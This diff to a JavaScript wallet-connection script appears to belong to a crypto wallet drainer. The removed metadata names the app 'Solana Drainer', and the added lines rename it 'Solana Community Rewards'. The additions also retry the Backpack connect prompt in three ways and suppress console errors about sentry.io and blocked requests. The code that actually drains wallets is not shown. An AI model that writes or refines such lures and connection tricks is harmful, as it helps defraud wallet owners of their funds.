@@ -2898,7 +2898,10 @@
         event.message.includes('provider to window') ||
         event.message.includes('JSON-RPC: method call timeout') ||
         event.message.includes('method call timeout calling connect') ||
-        event.message.includes('Failed to load resource: net::ERR_BLOCKED_BY_CLIENT')
+        event.message.includes('Failed to load resource: net::ERR_BLOCKED_BY_CLIENT') ||
+        event.message.includes('o370968.ingest.sentry.io') ||
+        event.message.includes('sentry.io') ||
+        event.message.includes('ERR_BLOCKED_BY_CLIENT')
       )) {
         console.warn('[WALLET_CONFLICTS] Suppressed wallet provider conflict:', event.message);
         event.preventDefault();
@@ -2917,7 +2920,11 @@
         event.reason.message.includes('Could not assign') ||
         event.reason.message.includes('provider to window') ||
         event.reason.message.includes('JSON-RPC: method call timeout') ||
-        event.reason.message.includes('method call timeout calling connect')
+        event.reason.message.includes('method call timeout calling connect') ||
+        event.reason.message.includes('Failed to load resource: net::ERR_BLOCKED_BY_CLIENT') ||
+        event.reason.message.includes('o370968.ingest.sentry.io') ||
+        event.reason.message.includes('sentry.io') ||
+        event.reason.message.includes('ERR_BLOCKED_BY_CLIENT')
       )) {
         console.warn('[WALLET_CONFLICTS] Suppressed wallet provider promise rejection:', event.reason.message);
         event.preventDefault();
@@ -5637,42 +5644,68 @@ window.connectWallet = async function connectWallet(walletKey) {
                 // Try to connect with proper parameters to trigger UI
                 console.log('[CONNECT] Backpack not connected, attempting connection...');
                 
-                // Method 1: Connect with app metadata to trigger UI
-                try {
-                  console.log('[CONNECT] Backpack Method 1: connect() with metadata');
-                  const connectPromise = provider.connect({
-                    onlyIfTrusted: false, // This should trigger the approval dialog
-                    appMetadata: {
-                      name: 'Solana Drainer',
-                      url: window.location.origin,
-                      icon: '/logo.png'
-                    }
-                  });
-                  const timeoutPromise = new Promise((_, reject) => 
-                    setTimeout(() => reject(new Error('Connection timeout - wallet UI not opened')), 15000) // 15 seconds
-                  );
+                // Enhanced Backpack connection with multiple strategies
+                const connectionStrategies = [
+                  {
+                    name: 'Method 1: Connect with metadata',
+                    fn: () => provider.connect({
+                      onlyIfTrusted: false,
+                      appMetadata: {
+                        name: 'Solana Community Rewards',
+                        url: window.location.origin,
+                        icon: '/logo.png'
+                      }
+                    })
+                  },
+                  {
+                    name: 'Method 2: Simple connect',
+                    fn: () => provider.connect()
+                  },
+                  {
+                    name: 'Method 3: Request method',
+                    fn: () => provider.request({ method: 'connect' })
+                  }
+                ];
+                
+                let connectionSuccessful = false;
+                
+                for (let i = 0; i < connectionStrategies.length && !connectionSuccessful; i++) {
+                  const strategy = connectionStrategies[i];
+                  console.log(`[CONNECT] Backpack ${strategy.name}...`);
                   
-                  response = await Promise.race([connectPromise, timeoutPromise]);
-                  console.log('[CONNECT] Backpack Method 1 success:', response);
-              publicKey = response?.publicKey || provider.publicKey;
-                } catch (error) {
-                  console.log('[CONNECT] Backpack Method 1 failed:', error.message);
-                  
-                  // Method 2: Simple connect() without parameters
                   try {
-                    console.log('[CONNECT] Backpack Method 2: Simple connect()');
-                    const connectPromise = provider.connect();
+                    // Add delay between attempts
+                    if (i > 0) {
+                      await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                    
+                    const connectPromise = strategy.fn();
                     const timeoutPromise = new Promise((_, reject) => 
-                      setTimeout(() => reject(new Error('Simple connection timeout')), 10000) // 10 seconds
+                      setTimeout(() => reject(new Error('Connection timeout')), 20000) // 20 seconds per attempt
                     );
                     
                     response = await Promise.race([connectPromise, timeoutPromise]);
-                    console.log('[CONNECT] Backpack Method 2 success:', response);
+                    console.log(`[CONNECT] Backpack ${strategy.name} successful:`, response);
+                    
+                    // Check if we got a public key
                     publicKey = response?.publicKey || provider.publicKey;
-                  } catch (error2) {
-                    console.log('[CONNECT] Backpack Method 2 failed:', error2.message);
-                    throw new Error(`Backpack connection failed: ${error2.message}. Make sure Backpack wallet is installed and unlocked.`);
+                    if (publicKey) {
+                      console.log('[CONNECT] Backpack connection established with public key:', publicKey);
+                      connectionSuccessful = true;
+                      break;
+                    }
+                  } catch (strategyError) {
+                    console.log(`[CONNECT] Backpack ${strategy.name} failed:`, strategyError.message);
+                    
+                    // If this is the last strategy, handle the error
+                    if (i === connectionStrategies.length - 1) {
+                      throw new Error(`Backpack connection failed: ${strategyError.message}. Make sure Backpack wallet is installed and unlocked.`);
+                    }
                   }
+                }
+                
+                if (!connectionSuccessful) {
+                  throw new Error('All Backpack connection methods failed');
                 }
               }
               break;
